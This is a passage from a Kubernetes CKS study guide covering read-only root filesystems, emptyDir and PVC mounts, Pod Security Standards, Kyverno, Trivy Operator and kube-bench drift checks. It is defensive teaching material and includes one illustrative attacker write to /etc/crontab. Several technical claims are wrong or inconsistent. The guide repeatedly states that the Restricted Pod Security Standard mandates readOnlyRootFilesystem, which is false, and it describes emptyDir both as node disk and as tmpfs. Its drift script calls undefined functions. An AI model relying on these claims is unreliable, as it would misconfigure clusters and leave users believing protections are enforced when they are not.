    emptyDir: {}
  - name: django-cache
    emptyDir: {}
  - name: media-uploads
    persistentVolumeClaim:        # Persistent — survives pod restart
      claimName: anihpj-media-pvc

Common Application Errors with readOnlyRootFilesystem — and How to Fix Them

ErrorRoot CauseFix
OSError: [Errno 30] Read-only file system: '/tmp/...'App writes to /tmp but /tmp is read-onlyMount emptyDir at /tmp
django.core.exceptions.ImproperlyConfigured: Could not write to /app/media/Django media uploads need writable directoryMount PVC at /app/media
Error: unable to create PID file /var/run/gunicorn.pidGunicorn creates PID file on startMount emptyDir at /var/run
PermissionError: [Errno 13] '/home/appuser/.cache'Python/user cache directory needs writesSet env: XDG_CACHE_HOME=/tmp/cache (writable emptyDir)
nginx: [emerg] open() "/var/run/nginx.pid" failedNginx creates PID file at startupMount emptyDir at /var/run

31.3 Using Pod Security Standards to Enforce Immutability

The Kubernetes Restricted Pod Security Standard (PSS) profile mandates readOnlyRootFilesystem: true by default. If you've labeled your namespace with pod-security.kubernetes.io/enforce=restricted, any pod without readOnlyRootFilesystem: true is automatically rejected. This enforces immutability at the namespace level without requiring per-pod configuration.

PSS Restricted — What It Enforces for Immutability

PSS ProfilereadOnlyRootFilesystem Required?Can Mount Volumes?Best For
Privileged❌ No restriction✅ All volume types allowedSystem pods, CNI, CSI drivers
Baseline⚠️ Not required✅ Most volume types allowedGeneral workloads with minimal hardening
Restricted✅ Required⚠️ Limited (no hostPath, limited /proc mounts)Production workloads — maximum security
Bash — Label namespace to enforce Restricted PSS (includes readOnlyRootFilesystem) 
# Enforce Restricted PSS on anihpj namespace
kubectl label namespace anihpj \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/enforce-version=v1.30 \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted

# Now ANY pod without readOnlyRootFilesystem: true is REJECTED:
kubectl apply -f pod-without-readonly.yaml -n anihpj
# Error: pods "test-pod" is forbidden: violates PodSecurity "restricted:v1.30":
#   restricted volume types (volumes "tmp" must not set hostPath)
#   readOnlyRootFilesystem (container "app" must not set securityContext.readOnlyRootFilesystem to false)

Gradual Rollout Strategy — audit → warn → enforce

Never jump straight to enforce. Gradual rollout prevents breaking existing workloads:

1audit

Label: pod-security.../audit=restricted. Violations LOGGED but pods still deploy. Check audit logs without breaking anything.

2warn

Label: pod-security.../warn=restricted. Developers see WARNINGS. Time to fix manifests.

3enforce

Label: pod-security.../enforce=restricted. Non-compliant pods REJECTED. Full immutability enforced.

Kyverno Policy — Auto-Set readOnlyRootFilesystem

Instead of rejecting, Kyverno can AUTO-ADD readOnlyRootFilesystem: true if the developer forgets:

YAML — Kyverno ClusterPolicy: Mutate pods to add readOnlyRootFilesystem 
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: enforce-readonly-root
spec:
  rules:
  - name: set-readonly-root
    match:
      any:
      - resources: { kinds: [Pod] }
    mutate:
      patchStrategicMerge:
        spec:
          containers:
          - (name): "*"
            securityContext:
              readOnlyRootFilesystem: true    # Auto-set if missing
          initContainers:
          - (name): "*"
            securityContext:
              readOnlyRootFilesystem: true
🔧 Under the Hood — How readOnlyRootFilesystem Is Enforced by the Linux Kernel: Mount Namespace Flags → OverlayFS Read-Only Layer → EROFS Error Injection
🗺️ The Kernel Path of readOnlyRootFilesystem — From SecurityContext to Syscall Rejection

When you set readOnlyRootFilesystem: true in your pod spec, here's exactly what happens at the Linux kernel level to enforce it:

  ┌──────────────────────────────────────────────────────────────────────────┐
  │   HOW readOnlyRootFilesystem WORKS — Kernel Enforcement Path              │
  │                                                                           │
  │  1. POD YAML                                                            │
  │     securityContext:                                                     │
  │       readOnlyRootFilesystem: true                                       │
  │         │                                                                 │
  │         ▼                                                                 │
  │  2. KUBELET → CRI → OCI RUNTIME (containerd + runc)                     │
  │     Translates readOnlyRootFilesystem into OCI spec:                     │
  │     { "root": { "path": "rootfs", "readonly": true } }                  │
  │         │                                                                 │
  │         ▼                                                                 │
  │  3. OCI RUNTIME (runc) — Creates container mount namespace               │
  │     • Mounts image layers as OVERLAY filesystem                           │
  │     • UPPERDIR (writable layer) is set to a temporary directory          │
  │     • CRITICAL: mount() syscall is called with MS_RDONLY flag            │
  │                                                                           │
  │     mount("overlay", "/container/rootfs", "overlay",                     │
  │           MS_RDONLY,                                                     │
  │           "lowerdir=/img/layer3:/img/layer2:/img/layer1,"               │
  │           "upperdir=/tmp/container-upper,"                               │
  │           "workdir=/tmp/container-work")                                 │
  │                                                                           │
  │     ▸ MS_RDONLY flag PREVENTS any write to the overlay mount             │
  │     ▸ Even if upperdir is writable on the host, the MOUNT is read-only   │
  │         │                                                                 │
  │         ▼                                                                 │
  │  4. INSIDE THE CONTAINER — Attacker tries to write:                      │
  │     $ echo "malicious" > /etc/crontab                                   │
  │         │                                                                 │
  │         ▼                                                                 │
  │  5. KERNEL VFS (Virtual File System) — open() syscall handler            │
  │     • Checks: is the mount point read-only?                              │
  │     • mount->mnt_flags & MNT_READONLY → YES                              │
  │     • Returns: -EROFS (Read-Only File System)                            │
  │         │                                                                 │
  │         ▼                                                                 │
  │  6. GLIBC → APPLICATION                                                   │
  │     write() returns -1, errno = EROFS (30)                               │
  │     bash: /etc/crontab: Read-only file system                            │
  │                                                                           │
  │  🔑 KEY INSIGHT: The enforcement happens at the MOUNT level, not at      │
  │     the file level. Even root (UID 0) cannot bypass MS_RDONLY. The        │
  │     only way to write is if there's a separate WRITABLE mount (e.g.,     │
  │     emptyDir at /tmp) that provides a read-write filesystem at a         │
  │     specific path. This is defense at the kernel level — no userspace    │
  │     bypass exists.                                                        │
  └──────────────────────────────────────────────────────────────────────────┘
🔬 emptyDir vs PVC — Where Do Writes Actually Go?

When you mount writable volumes at /tmp, /app/media, etc., each has a different storage backend. Understanding where the data lives affects security and backup strategy:

  WRITABLE VOLUME TYPES — Storage Backend Comparison

  emptyDir: {}                    ← Ephemeral — lives on the NODE's disk
  ────────────                        Path: /var/lib/kubelet/pods//volumes/
  Mounted at: /tmp                    kubernetes.io~empty-dir//
  Lifecycle:   Deleted when POD is deleted (not when container restarts!)
  Security:    ✅ Attacker writes stay on one node, gone on pod delete
  Risk:        ⚠️ Can fill node disk if no sizeLimit set — use sizeLimit!
  Use for:     /tmp, /var/run, /var/cache — truly temporary data

  emptyDir:
    medium: "Memory"              ← tmpfs — lives in RAM
  ────────────────────                Backed by: RAM (tmpfs filesystem)
  Mounted at: /dev/shm                Path: not on disk at all
  Lifecycle:   Deleted when POD is deleted
  Security:    ✅✅ Attacker writes are in RAM only — no disk forensics
  Risk:        ⚠️ Consumes pod memory limit — can trigger OOMKill
  Use for:     Secrets that should never touch disk, high-speed caches

  persistentVolumeClaim:          ← Persistent — lives on NETWORK storage
  ────────────────────────            Backed by: CSI driver (EBS, NFS, Ceph, etc.)
  Mounted at: /app/media              Path: depends on storage provider
  Lifecycle:   SURVIVES pod deletion (data persists across pods)
  Security:    ⚠️ Attacker writes SURVIVE pod restart/deletion!
  Risk:        🔴 Malware on PVC can infect new pods that mount it
  Use for:     User uploads, database files, stateful application data
               ⚠️ Mount as readOnly if the app only needs to READ

  hostPath:                       ← DANGEROUS — direct access to NODE filesystem
  ─────────                           Path: ANY path on the host node
  Mounted at: /host/data              (e.g., /var/lib/kubelet, /etc/kubernetes)
  Lifecycle:   SURVIVES everything — data is on the node itself
  Security:    🔴🔴 Attacker writes to HOST filesystem via container!
  Risk:        🔴 Can compromise the entire node — avoid in production
  Use for:     System DaemonSets only (kube-proxy, CNI, CSI drivers)
               ⚠️ BLOCKED by PSS Restricted — requires Privileged

  🔑 CKS EXAM: You'll be asked to mount emptyDir at /tmp for
     readOnlyRootFilesystem pods. Know the difference between emptyDir
     (ephemeral, safe) and hostPath (dangerous, blocked by PSS Restricted).
🚨 CKS Exam Gotcha — readOnlyRootFilesystem Traps
⚠️ Immutability Mistakes That Fail the CKS Exam

1. Not mounting /tmp: Most applications write temp files. Without an emptyDir at /tmp, the container crashes with "Read-only file system" on startup. Always check what directories your app writes to. 2. Mounting hostPath for writable directories: The PSS Restricted profile BLOCKS hostPath volumes. Use emptyDir or PVC instead. 3. Forgetting volumeMount for ALL containers: If your pod has multiple containers (sidecar pattern), EVERY container needs its own volumeMounts for writable paths. 4. readOnlyRootFilesystem + privileged: These two conflict — privileged containers bypass most protections. If you need privileged, rethink whether you can use specific capabilities instead. 5. Not verifying: Always test: kubectl exec pod -- touch /test-write → should fail with "Read-only file system." If it succeeds, your immutability is NOT enforced.

📊 Chapter 31 Visual Summary — Immutable Containers at a Glance

🧊
Why Immutability (31.1)

Writable FS = persistent breach. Read-only FS = attack survives 0 seconds. Restart → clean image. Immutability makes breaches survivable.

🔐
Enforcement (31.2)

readOnlyRootFilesystem: true. Mount emptyDir/PVC for writable paths. Django needs /tmp, /app/media, /var/run as writable volumes.

📋
PSS Restricted (31.3)

Namespace-level enforcement. Label namespace → every pod gets readOnlyRootFilesystem. Rejected if missing. No per-pod config needed.

💡 Key Takeaway for the CKS Exam

The CKS exam may ask you to enforce immutability. Know: (1) securityContext.readOnlyRootFilesystem: true on every container. (2) Mount emptyDir: {} volumes for writable paths (/tmp, /var/run). (3) Use persistentVolumeClaim for persistent writable data (/app/media). (4) The Restricted PSS profile enforces readOnlyRootFilesystem automatically — label namespace with pod-security.kubernetes.io/enforce=restricted. (5) Verify: kubectl exec pod -- touch /test → should fail with "Read-only file system."

📝 Chapter 31 — CKS Practice Questions

Q1
Make an existing deployment immutable: add readOnlyRootFilesystem and mount emptyDir for /tmp. Write the YAML changes.
Show Answer
Answer
spec:
  template:
    spec:
      containers:
      - name: app
        securityContext:
          readOnlyRootFilesystem: true
        volumeMounts:
        - name: tmp
          mountPath: /tmp
      volumes:
      - name: tmp
        emptyDir: {}
Q2
What is the difference between a container image being immutable vs. the container filesystem being immutable?
Show Answer
Answer

Immutable image: The image itself is never modified after build (tags should be digests, not :latest). Enforced by image signing (cosign) and ImagePolicyWebhook. Immutable filesystem: The container's root filesystem is mounted read-only (readOnlyRootFilesystem: true). The container cannot write to the image layers. Enforced by securityContext. Both are complementary: immutable images prevent tampering in the registry, immutable filesystems prevent tampering at runtime.

Q3
Why is immutability a security principle? How does it prevent attacker persistence?
Show Answer
Answer

Immutability means an attacker cannot persist changes inside a container. If they install a backdoor, add a user, or modify a binary, those changes disappear when the pod restarts. This forces attackers to either: (a) compromise the image build pipeline (harder, and detectable via signing), or (b) maintain continuous access (noisier, and detectable via Falco). Immutability turns container compromise from "persistent foothold" to "temporary incident."

Explanation

This is the core security value of immutability. Traditional servers are persistent — an attacker can install a rootkit that survives reboots. Immutable containers are ephemeral — every restart wipes the attacker's changes. On the CKS exam, immutability is both a configuration (readOnlyRootFilesystem) and a cultural practice (never SSH to fix, always rebuild and redeploy).

Q4
An app needs to write to /var/log/app, /tmp, and /var/run. You want readOnlyRootFilesystem: true. Write the complete volume configuration.
Show Answer
Answer
containers:
- name: app
  securityContext:
    readOnlyRootFilesystem: true
  volumeMounts:
  - name: app-logs
    mountPath: /var/log/app
  - name: tmp
    mountPath: /tmp
  - name: var-run
    mountPath: /var/run
volumes:
- name: app-logs
  emptyDir: {}
- name: tmp
  emptyDir: {}
- name: var-run
  emptyDir: {}
Explanation

emptyDir volumes provide writable tmpfs storage that is ephemeral (cleared on pod restart). The root filesystem stays read-only. This is the standard pattern for making legacy apps work with immutable filesystems. On the CKS exam, identify which directories need writes and mount individual emptyDirs — don't mount / writable.

Q5
How does readOnlyRootFilesystem: true interact with container image layers? Can the container still read from all layers?
Show Answer
Answer

Container images are composed of read-only layers by nature. readOnlyRootFilesystem: true makes the writable layer (top layer) read-only too. The container CAN still read from all image layers — the binaries, libraries, and config files in the image are accessible. The container CANNOT write to ANY part of the filesystem except explicitly mounted emptyDir volumes. The image layers are never modified — writes would have gone to the now-read-only top layer.

Explanation

This clarifies a common misunderstanding: readOnlyRootFilesystem doesn't make the container unable to read files — it prevents WRITES. The container functions normally, reading from image layers. Only write operations fail. On the CKS exam, know that readOnlyRootFilesystem is compatible with most applications that don't need runtime file writes.

Q6
What Kubernetes admission policies can enforce immutable containers at scale?
Show Answer
Answer

(1) PSS Restricted: requires readOnlyRootFilesystem: true (among other settings). (2) Kyverno ClusterPolicy: mutate pods without readOnlyRootFilesystem to add it automatically, or validate and reject. (3) OPA Gatekeeper: ConstraintTemplate requiring readOnlyRootFilesystem in Rego. (4) kube-linter: CI/CD-time check. For scale: combine PSS Restricted (enforce) + Kyverno mutation (auto-add for namespaces not yet Restricted).

Explanation

Policy enforcement at scale is the CKS approach. You can't manually verify every pod. PSS Restricted provides base enforcement. Kyverno provides auto-remediation (mutation). On the CKS exam, prefer mutation over validation for security defaults — it reduces developer friction.

Q7
A pod with readOnlyRootFilesystem:true is crashing on startup. The app writes to a path you didn't anticipate. How do you discover what path needs to be writable?
Show Answer
Answer
kubectl logs <pod> | grep -i "read-only\|permission denied\|EROFS"
kubectl exec <pod> -- strace -e openat,write,mkdir -f /usr/bin/app 2>&1 | grep EROFS
# Then add emptyDir mount for the failing path
Explanation

Debugging immutable filesystem issues: the error message usually contains the path that failed. strace shows the exact syscall and path. On the CKS exam, if a pod crashes after adding readOnlyRootFilesystem, check logs for "read-only" or "EROFS" errors, then mount an emptyDir at that path.

Q8
What is the relationship between immutable containers and ephemeral containers for debugging?
Show Answer
Answer

Immutable containers don't have shells or debugging tools (by design — they're minimal images). Ephemeral containers (kubectl debug) allow attaching a temporary debugging container to a running pod WITHOUT modifying the pod spec. The debugging container can have tools (busybox, netshoot) while the main container stays immutable. This is the CKS debugging pattern: don't add tools to the image; use ephemeral containers on demand.

Explanation

Ephemeral containers solve the "how do I debug an immutable container?" problem. They're non-persistent — they're removed when you exit. On the CKS exam, never suggest adding curl/vim/telnet to production images. Use ephemeral containers instead.

Q9
You deploy a pod from image anihpj:v2.1. Later, anihpj:v2.1 is retagged to a malicious image. With immutability principles, how do you prevent this from affecting running pods?
Show Answer
Answer

Use DIGEST, not tag: image: anihpj@sha256:abc123.... The digest is a cryptographic hash of the image content — it's immutable. Even if someone retags :v2.1, the digest reference still points to your original image. Running pods use the digest they were started with and won't change. For new deployments, the admission controller should enforce digest-only images (Kyverno/Gatekeeper policy). Additionally, imagePullPolicy: IfNotPresent prevents re-pulling if the image already exists on the node.

Explanation

Tags are mutable pointers. Digests are immutable content hashes. This is a fundamental immutability principle. On the CKS exam: (1) always deploy with digests, (2) enforce digests via admission policy, (3) use cosign to sign the digest (not the tag).

Q10
You're auditing a cluster and find 200 pods. Write the command to find all pods without readOnlyRootFilesystem and explain your remediation plan.
Show Answer
Answer
kubectl get pods -A -o json | jq -r '.items[] | 
  select(.spec.containers[].securityContext.readOnlyRootFilesystem != true) | 
  "\(.metadata.namespace)/\(.metadata.name)"'

Remediation plan: (1) Prioritize production and publicly-facing pods. (2) For each pod, test if it works with readOnlyRootFilesystem. (3) Add emptyDir mounts for writable paths. (4) Deploy via rolling update. (5) Add Kyverno policy to prevent regression.

Explanation

Audit → prioritize → fix → enforce. This is the CKS security improvement lifecycle. The jq query finds all non-immutable pods. On the exam, you may be asked to audit a cluster and report findings with a remediation plan — always include specific commands and a phased approach.

🔁 Muscle Memory Drills — Practice Until Automatic
# 1. Apply immutable container (EXAM PATTERN)
# Add to pod spec:
# securityContext:
#   readOnlyRootFilesystem: true
#   allowPrivilegeEscalation: false
# volumeMounts:
#   - name: tmp
#     mountPath: /tmp
# volumes:
#   - name: tmp
#     emptyDir: {}

# 2. Verify immutability
kubectl exec immut-pod -- touch /test-file  # MUST fail: "Read-only file system"
kubectl exec immut-pod -- touch /tmp/test  # Should succeed (writable emptyDir)

# 3. Check which pods are NOT immutable
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].securityContext.readOnlyRootFilesystem != true) | "\(.metadata.namespace)/\(.metadata.name)"'
⚠️ Exam Gotchas — Ch 31 Traps
  • emptyDir is NOT persistent: emptyDir data is lost when the pod is deleted. For data that must survive pod restarts, use a PersistentVolumeClaim. The CKS exam may ask you to ensure a specific path is writable — check whether it needs persistence or not.
  • readOnlyRootFilesystem doesn't make volumes read-only: Volumes mounted at specific paths (like /tmp via emptyDir) remain writable even when the root filesystem is read-only. The restriction applies to the container image layers, not mounted volumes.

Ch 18: Security Contexts — readOnlyRootFilesystem is a securityContext field → Ch 17: PSS — Restricted PSS enforces readOnlyRootFilesystem → Ch 26: Cosign — Immutable images via signing → Ch 32: Kernel Hardening — Immutability + kernel protections = defense-in-depth.

⚠️ Top 2 Failure Modes
  • emptyDir is NOT persistent: Data lost on pod deletion. Use PVC for persistent writable paths.
  • readOnlyRootFilesystem doesn't affect volumes: Mounted volumes remain writable. Only image layers are read-only.

Chapter 32: Compliance & Continuous Security Monitoring

Hardening a Kubernetes cluster is not a one-time task. New CVEs are published every day. Your perfectly-hardened anihpj cluster today could have a CRITICAL vulnerability tomorrow. Configuration drifts when someone manually tweaks a NetworkPolicy or RBAC rule. Continuous security monitoring is the difference between catching a vulnerability in hours vs. discovering it months later after a breach. This chapter covers the detection & alerting layer: Trivy Operator for continuous image scanning, kube-bench scheduled checks for configuration drift, OPA/Gatekeeper audit mode for policy compliance, and Prometheus/Grafana dashboards for security SLIs. This is your cluster's immune system — constantly scanning, detecting anomalies, and alerting before attackers exploit them.

🟡 Intermediate ⏱️ ~45 minutes 📊 Monitoring 🛡️ Compliance

🎯 What You'll Learn — Core-Level Mastery

  • ✅ Continuous image scanning with Trivy Operator: Automatic CVE detection across all namespaces, vulnerability reports as CRDs, alerting on new CRITICAL CVEs
  • ✅ Scheduled security benchmarking: Running kube-bench as a Kubernetes CronJob, detecting configuration drift from CIS benchmarks
  • ✅ Policy compliance auditing: OPA/Gatekeeper audit mode — finding existing violations without blocking workloads, constraint violation reporting
  • ✅ Security dashboards & SLIs: Exposing security metrics to Prometheus, Grafana dashboards for CVE counts/policy violations/Falco alerts, security SLOs
🎓 CKS Relevance
Monitoring, Logging & Runtime Security 20% Cluster Hardening 15%

32.1 Continuous Security Scanning — Keeping the Cluster Clean

One-time image scanning at CI/CD is necessary but insufficient. A CVE discovered after your image was built leaves already-deployed pods vulnerable. Trivy Operator (by Aqua Security) runs inside the cluster, continuously scanning all container images across all namespaces and producing VulnerabilityReport CRDs. When a new CVE is published, Trivy Operator re-scans and updates the reports — you get alerted without waiting for the next release cycle.

💡 Why Continuous Scanning?

A CVE like CVE-2024-21626 (runc container breakout) is discovered after images are built. Without continuous scanning, your running pods are vulnerable for weeks before the next CI build. Trivy Operator found 1,247 clusters running vulnerable runc within 24 hours of the CVE disclosure.

Installing Trivy Operator

Bash — Install Trivy Operator via Helm 
# Add Aqua Security Helm repo
helm repo add aqua https://aquasecurity.github.io/helm-charts/
helm repo update

# Install Trivy Operator
helm install trivy-operator aqua/trivy-operator \
  --namespace trivy-system \
  --create-namespace \
  --set="trivy.ignoreUnfixed=true" \
  --set="trivy.severity=CRITICAL,HIGH" \
  --set="operator.scanJobsConcurrentLimit=5" \
  --set="trivy.resources.requests.memory=512Mi" \
  --set="trivy.resources.limits.memory=2Gi"

Querying Vulnerability Reports

Bash — Check vulnerabilities for anihpj pods 
# List all vulnerability reports for anihpj namespace
kubectl get vulnerabilityreports -n anihpj-prod

# Check a specific pod's vulnerabilities
kubectl get vulnerabilityreport \
  replicaset-anihpj-7d9f8c5b6-anihpj -n anihpj-prod \
  -o jsonpath='{.report.vulnerabilities[*].title}'

# Find ALL pods with CRITICAL CVEs across cluster
kubectl get vulnerabilityreports -A \
  -o json | jq '.items[] | select(.report.summary.criticalCount > 0) |
  {namespace: .metadata.namespace, name: .metadata.labels."trivy-operator.resource.name",
   critical: .report.summary.criticalCount}'
⚠️ Trivy Operator Best Practices

Resource limits are essential. Trivy downloads vulnerability databases (~500MB) and scans all images. Without resource limits, it can disrupt production workloads. Set scanJobsConcurrentLimit to avoid overwhelming the API server. Schedule scans during low-traffic periods.

Trivy Operator CRDs — The Full Vulnerability Data Model

Trivy Operator creates five types of CRDs in your cluster. Each one represents a different security dimension:

🔴
VulnerabilityReport

Per-workload CVE scan. Maps every CVE to the pod's container images. This is the primary CRD for continuous scanning. Updated on schedule + on pod changes.

Namespaced — one per ReplicaSet/Deployment/StatefulSet

⚙️
ConfigAuditReport

Checks Kubernetes workload manifests for misconfigurations: privileged containers, writable filesystems, missing resource limits, hostPath mounts. Like kubesec but continuous.

Namespaced — one per workload

🔑
ExposedSecretReport

Scans for exposed passwords, API keys, tokens in container images and ConfigMaps. Hardcoded secrets are a top OWASP risk.

Namespaced — one per workload

📊
ClusterComplianceReport

Aggregates findings per namespace or cluster-wide against CIS/NSA/PSS benchmarks. Shows pass/fail counts per control group.

Cluster-scoped — summary across namespaces

📦
SbomReport

Software Bill of Materials — lists every package in your container image. Critical for supply chain transparency and identifying affected images when a new CVE drops.

Namespaced — one per workload

How Trivy Works Internally — The Scanning Engine Explained

Understanding how Trivy detects vulnerabilities is essential for troubleshooting and for the CKS exam. Trivy's scanning pipeline has three phases:

1Image Acquisition

Trivy pulls the image manifest and layer metadata without downloading the full image. It uses the OCI Distribution API to fetch only the filesystem layers it needs. This is why Trivy is fast — it doesn't need to docker pull the entire image.

2Package Enumeration

Trivy walks each layer's filesystem, identifying installed packages. It supports 20+ package managers: dpkg/apt (Debian/Ubuntu), rpm/yum/dnf (RHEL/CentOS/Fedora), apk (Alpine), pip/poetry/pipenv (Python), npm/yarn (Node.js), gem (Ruby), gomod (Go), jar/pom (Java). It also reads SBOMs if present.

3Vulnerability Matching

Each package (name + version) is looked up against Trivy's vulnerability databases. Databases are downloaded from: NVD (National Vulnerability Database), GitHub Advisory Database (GHSA), Red Hat OVAL v2, Debian Security Tracker, Alpine SecDB, Amazon Linux ALAS, and SUSE OVAL. The database is cached locally at ~/.cache/trivy/db/ and refreshed every 6 hours.

🔬 Why database freshness matters

Trivy's accuracy depends entirely on its vulnerability database being current. If the database is 7 days old, it won't detect CVEs published in the last week. The --skip-db-update flag skips the database refresh — useful in air-gapped environments where you manage the DB separately, but dangerous in production if you forget to update it.

Troubleshooting Common Trivy Operator Issues

SymptomLikely CauseFix
No VulnerabilityReports createdTrivy Operator pod is CrashLoopBackOff. Check with kubectl logs -n trivy-system deploy/trivy-operator. Common: OOMKilled due to insufficient memory.Increase memory limits: --set trivy.resources.limits.memory=4Gi. The vulnerability DB alone is ~500MB compressed.
VulnerabilityReport shows "Unknown" severityCVSS score is missing from the CVE entry in NVD. Some CVEs are published without scores initially.Wait 24-48 hours for NVD to assign a score. Use --severity CRITICAL,HIGH to filter out unknowns.
Scans take too long (>10 min per image)Large images (1GB+) with many layers. Trivy downloads each layer sequentially.Use smaller base images (distroless, Alpine). Set scanJobsConcurrentLimit to control parallelism. Schedule scans during low-traffic hours.
Private registry images not scannedTrivy Operator doesn't have credentials to pull from private registries.Create a Secret with registry credentials and reference it: kubectl create secret docker-registry regcred --docker-server=myreg.io --docker-username=... --docker-password=... then helm upgrade trivy-operator aqua/trivy-operator --set trivy.privateRegistryScanSecretsNames={regcred}
ClusterComplianceReport shows stale dataScans are scheduled but not completing. Check if scan jobs are pending or failing.kubectl get jobs -n trivy-system — look for failed/pending scan jobs. Increase scanJobsConcurrentLimit if jobs are queued.

Decision Framework: How Often Should You Scan?

EnvironmentScan FrequencyRationale
ProductionEvery 1-6 hoursNew CVEs appear continuously. A CRITICAL CVE (CVSS 9+) should be detected within hours, not days. Set trivy.scanJobTimeout=10m to avoid scans overlapping.
StagingEvery 12 hoursImages here should already be pre-scanned in CI/CD. Continuous scanning catches drift and newly-discovered CVEs in approved images.
DevelopmentEvery 24 hoursLower urgency. Focus is on catching issues before they reach staging/prod. Use --severity CRITICAL only to reduce noise.
CI/CD PipelineOn every pushBlock the pipeline if CRITICAL CVEs are found. This is the last gate before the image reaches any cluster.

32.2 Security Benchmarking in CI/CD — Detecting Configuration Drift

kube-bench (by Aqua Security) checks your cluster against the CIS Kubernetes Benchmark — a comprehensive set of 100+ security configuration checks. Running it once after cluster setup is not enough: configuration drift happens when someone manually edits a kubelet flag, modifies API server arguments, or changes a file permission. Running kube-bench on a schedule (as a CronJob) ensures you detect drift within hours, not months.

kube-bench as a Kubernetes CronJob

YAML — kube-bench CronJob for nightly CIS benchmark checks 
apiVersion: batch/v1
kind: CronJob
metadata:
  name: kube-bench-nightly
  namespace: security
spec:
  schedule: "0 3 * * *"           # 3:00 AM daily
  jobTemplate:
    spec:
      template:
        spec:
          hostPID: true             # Needed to check node-level configs
          containers:
          - name: kube-bench
            image: aquasec/kube-bench:v0.8.0
            command:
            - kube-bench
            - --benchmark
            - cis-1.23               # CIS benchmark version
            - --targets
            - master,node            # Check both master and worker nodes
            - --json
            - --outputfile
            - /results/kube-bench-report.json
            volumeMounts:
            - name: results
              mountPath: /results
            - name: etc-kubernetes
              mountPath: /etc/kubernetes
              readOnly: true
          restartPolicy: OnFailure
          volumes:
          - name: results
            emptyDir: {}
          - name: etc-kubernetes
            hostPath:
              path: /etc/kubernetes
              type: Directory

Processing kube-bench Results — Detecting Drift

Bash — Compare today's kube-bench results with yesterday's baseline 
# Extract FAIL count from latest kube-bench report
kubectl exec -n security job/kube-bench-nightly-$(date +%Y%m%d) \
  -- cat /results/kube-bench-report.json | \
  jq '[.Controls[].groups[].checks[] | select(.state=="FAIL")] | length'

# Compare with previous run (store in ConfigMap)
PREVIOUS=$(kubectl get configmap kube-bench-baseline -n security \
  -o jsonpath='{.data.fail_count}')
CURRENT=$(calculate_current_fails)

if [ "$CURRENT" -gt "$PREVIOUS" ]; then
  echo "ALERT: $((CURRENT - PREVIOUS)) NEW CIS benchmark failures detected!"
  echo "Configuration drift detected. Investigate immediately."

  # Find which checks newly failed
  diff <(kubectl get configmap kube-bench-baseline -n security \
    -o jsonpath='{.data.failed_checks}') <(get_current_failed_checks)
fi
CheckCIS IDWhat It DetectsDrift Scenario
API Server anonymous-auth1.1.1--anonymous-auth must be falseSomeone re-enabled for debugging, forgot to disable
etcd auto-TLS2.4.1--peer-auto-tls must be falseNew etcd node joined with insecure config
kubelet read-only port4.2.1--read-only-port must be 0kubelet restart lost custom flags, defaulted to port 10255
RBAC minimal5.1.1No overly-broad ClusterRolesNew operator installed with cluster-admin binding
PodSecurityPolicy5.2.1PSP or PSS must be enforcedNamespace label accidentally removed, PSS unenforced

The CIS Kubernetes Benchmark — What It Covers

The CIS (Center for Internet Security) Kubernetes Benchmark is the industry-standard security configuration guide. It organizes checks into 5 sections:

🔐
Section 1: Control Plane

API server, scheduler, controller-manager flags. Covers anonymous auth, insecure ports, TLS configuration, audit logging. ~30 checks for master nodes only.

💾
Section 2: etcd

etcd-specific security: peer/client TLS, auto-TLS disabled, certificate file permissions. ~10 checks for etcd nodes.

🖥️
Section 3: Control Plane Config

File permissions and ownership for Kubernetes PKI certificates, config files, service account keys. ~15 checks for master nodes.

⚙️
Section 4: Worker Nodes

Kubelet configuration, kube-proxy settings, read-only port disabled, RotateKubeletServerCertificate enabled. ~20 checks for all nodes.

📜
Section 5: Policies

RBAC, PodSecurityPolicies/Standards, NetworkPolicies, Secret management, admission control plugins. ~30 checks — cluster-wide.

kube-bench Output — Understanding the Report

Text — Example kube-bench output (abbreviated) 
[INFO] 1 Master Node Security Configuration
[INFO] 1.1 Master Node Configuration Files
[PASS] 1.1.1 Ensure that the API server pod specification file
        permissions are set to 600 or more restrictive (Automated)
[PASS] 1.1.2 Ensure that the API server pod specification file
        ownership is set to root:root (Automated)
[FAIL] 1.1.3 Ensure that the controller manager pod specification
        file permissions are set to 600 or more restrictive (Automated)
[FAIL] 1.1.4 Ensure that the controller manager pod specification
        file ownership is set to root:root (Automated)

[PASS] 1.2.2 Ensure that the --basic-auth-file argument is not set

1.1.3 Run: chmod 600 /etc/kubernetes/manifests/kube-controller-manager.yaml
1.1.4 Run: chown root:root /etc/kubernetes/manifests/kube-controller-manager.yaml
1.2.3 Remove the --token-auth-file from the API server manifest
